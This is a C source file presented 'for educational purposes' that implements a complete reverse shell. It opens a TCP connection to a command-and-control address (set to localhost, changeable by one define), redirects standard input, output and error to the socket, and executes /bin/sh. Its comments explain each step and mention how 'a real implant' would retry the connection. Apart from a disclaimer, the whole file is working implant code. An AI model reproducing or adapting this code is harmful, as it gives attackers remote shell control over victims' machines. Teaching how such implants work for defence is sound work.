#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

// DISCLAIMER: For Educational Purposes Only. 
// Do not use this on networks you do not own.

#define C2_IP "127.0.0.1"  // Target your own machine
#define C2_PORT 8000

int main() {
    struct sockaddr_in sa;
    int s;

    // 1. Create the socket (Phone line)
    s = socket(AF_INET, SOCK_STREAM, 0);
    
    // 2. Setup the address (Who to call)
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(C2_IP);
    sa.sin_port = htons(C2_PORT);

    // 3. Connect to the C2 (Dialing)
    // In a real implant, you would loop this until it connects
    int err = connect(s, (struct sockaddr *)&sa, sizeof(sa));
    if (err < 0) {
        printf("[-] Failed to connect to C2.\n");
        return 1;
    }

    // 4. Redirect Input/Output
    // This connects the socket (s) to the process's standard input (0), output (1), and error (2).
    // Anything the C2 sends becomes input. Anything the shell prints goes to the socket.
    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);

    // 5. Execute the Shell
    // This replaces the current process with /bin/sh
    execve("/bin/sh", NULL, NULL);

    return 0;
}
